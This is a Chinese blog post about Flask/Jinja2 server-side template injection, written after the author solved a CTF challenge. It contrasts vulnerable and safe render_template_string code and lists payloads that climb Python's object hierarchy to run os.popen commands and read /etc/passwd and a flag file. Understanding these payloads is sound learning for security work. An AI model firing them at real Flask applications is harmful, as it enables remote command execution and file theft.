@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Pooka.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/Pooka.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"npfs06.top","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="在攻防世界做到一道涉及模板注入的题Web_python_template_injection，简单了解了一下模板注入">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Flask模板注入">
+<meta property="og:url" content="https://npfs06.top/posts/Flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5.html">
+<meta property="og:site_name" content="安小琪&#39;s blog">
+<meta property="og:description" content="在攻防世界做到一道涉及模板注入的题Web_python_template_injection，简单了解了一下模板注入">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-04-23T01:42:01.000Z">
+<meta property="article:modified_time" content="2020-04-23T01:42:01.000Z">
+<meta property="article:author" content="安小琪">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://npfs06.top/posts/Flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : false,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Flask模板注入 | 安小琪's blog
+</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">安小琪's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">少年有梦，不应止于心动</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+  
+  
+
+          <div class="content page posts-expand">
+            
+
+    
+    
+    
+    <div class="post-block" lang="en">
+      <header class="post-header">
+
+<h1 class="post-title" itemprop="name headline">Flask模板注入
+</h1>
+
+<div class="post-meta">
+  
+
+</div>
+
+</header>
+
+      
+      
+      
+      <div class="post-body">
+          <p>在攻防世界做到一道涉及模板注入的题<a href=" https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5408&page=1" target="_blank">Web_python_template_injection</a>，简单了解了一下模板注入<a id="more"></a></p>
+<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p><code>模板</code>可以理解为是一段固定好格式，并等着你来填充信息的文件，<code>模板注入</code>就是指将一串指令代替变量传入模板中让它执行</p>
+<p>先了解了一下装饰器的概念</p>
+<p><strong>装饰器</strong>:  简单讲就是在一个函数内部定义另外一个函数,然后返回一个新的函数,即动态的给一个对象添加额外的职责。比如有一个函数func(a, b)，它的功能是求a,b的差值，我们现在想对函数功能再装饰下，求完差值后再取绝对值，但是不能在func函数内部实现，这时候就需要装饰器函数了，比如func= decorate(func)函数，将func函数作为参数传递给decorate函数，由decorate来丰富func函数，丰富完成后再返回给func,此时func的功能就丰富了。</p>
+<p><code>@</code> 用做函数的修饰符，可以在模块或者类的定义层内对函数进行修饰</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decorate</span><span class="params">(func)</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span><span class="params">(a, b)</span></span><span class="symbol">:</span></span><br><span class="line">        ret = func(a, b)<span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> abs(ret)</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"> @decorate</span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">sub</span><span class="params">(a, b)</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">return</span> a-b</span><br><span class="line">    </span><br><span class="line"> print sun(<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line"> </span><br><span class="line"> =&gt;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+
+<p><strong>@app.route</strong></p>
+<p>app.route装饰器作用是把函数和URL绑定</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> flask </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_word</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello word&#x27;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>访问<code>http://url/index</code>的时候，flask会返回<code>Hello World</code></p>
+</blockquote>
+<p><strong>渲染</strong></p>
+<ul>
+<li>render_template      用来渲染一个指定的文件的</li>
+<li>render_template_string      用来渲染一个字符串</li>
+</ul>
+<p><strong>模板</strong></p>
+<p>Flask使用Jinja2渲染引擎，以<code>&#123;&#123;&#125;&#125;`作为变量包裹的标识符同时，这个符号包裹内还可以执行一些简单的表达式
+
+模板引擎会对输入变量进行编码转义：
+
+错误使用：
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    code = request.args.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    html = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>%(code)</span><br><span class="line"> <span class="keyword">return</span> render_template_string(html)</span><br></pre></td></tr></table></figure>
+上面这段代码直接将用户输入作为了模板，不会经过转义和过滤的步骤，我们在传入`code`时，可以用`&#123;&#123;&#125;&#125;</code>来包裹代码，以替代本应时参数的<code>id</code></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://url/?id=">http://url/?id=</a></p>
+</blockquote>
+<p>正确使用：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@app</span>.route(<span class="string">&#x27;/test/&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    code = request.args.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&#x27;&lt;h1&gt;&#123;&#123; code &#125;&#125;&lt;/h1&gt;&#x27;</span>,code=code)</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h1><p>通过Python对象的继承，用魔术方法一步步找到可利用的方法去执行。即找到父类<code>&lt;type &#39;object&#39;&gt;</code>–&gt;寻找子类–&gt;找关于命令执行或者文件操作的模块</p>
+<blockquote>
+<p>os.system  退出状态码<br>os.popen    以file形式返回输出内容</p>
+</blockquote>
+<p><strong>对象的魔术方法：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">__class__</span>  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line"><span class="comment">// __base__和__mro__都是用来寻找基类的</span></span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure>
+
+
+<p><strong>步骤</strong></p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#测试是否存在模板注入</span><br><span class="line">&gt;&gt;&gt;&#123;&#123;<span class="number">1</span>+<span class="number">1</span>&#125;&#125;</span><br><span class="line">[构造简单的payload，看服务器是否有回显]</span><br><span class="line"></span><br><span class="line">#获取<span class="string">&#x27;&#x27;</span>字符串的所属对象</span><br><span class="line">&gt;&gt;&gt; <span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line">#获取str类的父类</span><br><span class="line">&gt;&gt;&gt; <span class="string">&#x27;&#x27;</span>.__class__.__mro__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br><span class="line"></span><br><span class="line">#获取object类的所有子类</span><br><span class="line">&gt;&gt;&gt; <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()</span><br><span class="line">[&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytes&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;NoneType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;traceback&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;super&#x27;</span>&gt;...</span><br><span class="line"></span><br><span class="line"> #找到所需的类在列表第几位（从第<span class="number">0</span>位开始）</span><br><span class="line"> &gt;&gt;&gt;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;命令行语句&#x27;</span>).read()</span><br><span class="line"> [ popen(<span class="string">&#x27;ls&#x27;</span>).read(),意思是得到ls的结果并读取给变量，因此它会把当前目录所有文件都打印在我们的网页上]</span><br><span class="line"></span><br><span class="line">注：for i <span class="keyword">in</span> enumerate(<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()): print i </span><br><span class="line">可用来列举类</span><br><span class="line"></span><br><span class="line"> #读取文件内容</span><br><span class="line"> &gt;&gt;&gt;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat fl4g&#x27;</span>).read()</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">常用payload:</span><br><span class="line">&gt;&gt;&gt;<span class="string">&#x27;&#x27;</span>.<span class="variable">__class__</span>.<span class="variable">__mro__</span>[<span class="number">2</span>].<span class="variable">__subclasses__</span>()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line">&gt;&gt;&gt;<span class="string">&#x27;&#x27;</span>.<span class="variable">__class__</span>.<span class="variable">__mro__</span>[<span class="number">2</span>].<span class="variable">__subclasses__</span>()[<span class="number">71</span>].<span class="variable">__init__</span>.<span class="variable">__globals__</span>[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">&gt;&gt;&gt;<span class="string">&#x27;&#x27;</span>.<span class="variable">__class__</span>.<span class="variable">__mro__</span>[<span class="number">1</span>].<span class="variable">__subclasses__</span>()[<span class="number">71</span>].<span class="variable">__init__</span>.<span class="variable">__globals__</span>[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat fl4g&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+<p>包含os模块的类：</p>
+<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;site._Printer&#x27;</span>&gt;</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;site.Quitter&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/26724125">https://zhuanlan.zhihu.com/p/26724125</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017451662295584#0">https://www.liaoxuefeng.com/wiki/1016959663602400/1017451662295584#0</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/b6f1aea3a2eb">https://www.jianshu.com/p/b6f1aea3a2eb</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zss192/article/details/104200493">https://blog.csdn.net/zss192/article/details/104200493</a></p>
+<hr>
+<p><strong>补充下：</strong><br>内置函数：get_flashed_messages(), url_for()</p>
+<p>url_for()<br>一般我们通过一个URL就可以执行到某一个函数。如果反过来，我们知道一个函数，怎么去获得这个URL呢？url_for函数就可以帮我们实现这个功能。url_for()函数接收两个及以上的参数，他接收函数名作为第一个参数，接收对应URL规则的命名参数，如果还出现其他的参数，则会添加到URL的后面作为查询参数。</p>
+<p>get_flashed_messages()<br>返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。</p>
+
+      </div>
+      
+      
+      
+    </div>
+    
+
+    
+    
+    
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">基础知识</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#reference"><span class="nav-number">3.</span> <span class="nav-text">reference</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="安小琪"
+      src="/images/header.jpg">
+  <p class="site-author-name" itemprop="name">安小琪</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">101</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/npfs06" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;npfs06" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:npfs066@gmail.com" title="E-Mail → mailto:npfs066@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://hyluz.cn/" title="https:&#x2F;&#x2F;hyluz.cn&#x2F;" rel="noopener" target="_blank">Luz</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://0clickjacking0.github.io/" title="https:&#x2F;&#x2F;0clickjacking0.github.io&#x2F;" rel="noopener" target="_blank">xianyu123</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://jiang-niao.github.io/" title="https:&#x2F;&#x2F;jiang-niao.github.io&#x2F;" rel="noopener" target="_blank">JiangNiao</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://xiaolong22333.top/" title="https:&#x2F;&#x2F;xiaolong22333.top&#x2F;" rel="noopener" target="_blank">xiaolong</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+
+
+<!--
+ <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+-->
+
+
+  <span class="author" itemprop="copyrightHolder">安小琪</span>
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">浙ICP备2020030100号 </a>
+  </div>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+<script>
+document.querySelectorAll('.pdfobject-container').forEach(element => {
+  let url = element.dataset.target;
+  let pdfOpenParams = {
+    navpanes : 0,
+    toolbar  : 0,
+    statusbar: 0,
+    pagemode : 'thumbs',
+    view     : 'FitH'
+  };
+  let pdfOpenFragment = '#' + Object.entries(pdfOpenParams).map(([key, value]) => `${key}=${encodeURIComponent(value)}`).join('&');
+  let fullURL = `/lib/pdf/web/viewer.html?file=${encodeURIComponent(url)}${pdfOpenFragment}`;
+
+  if (NexT.utils.supportsPDFs()) {
+    element.innerHTML = `<embed class="pdfobject" src="${url + pdfOpenFragment}" type="application/pdf" style="height: ${element.dataset.height};">`;
+  } else {
+    element.innerHTML = `<iframe src="${fullURL}" style="height: ${element.dataset.height};" frameborder="0"></iframe>`;
+  }
+});
+</script>
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'nhITwFwMLqOi81E1nOPXx9Iw-MdYXbMMI',
+      appKey     : 'F9l5INUqgwxvbJOfC1X7OMnr',
+      placeholder: "欢迎在这里留言！我看到一定会及时回复的噢 （PS：回复信息会自动发送到你所填写的邮箱噢）",
+      avatar     : '',
+      meta       : guest,
+      pageSize   : '6' || 10,
+      visitor    : false,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
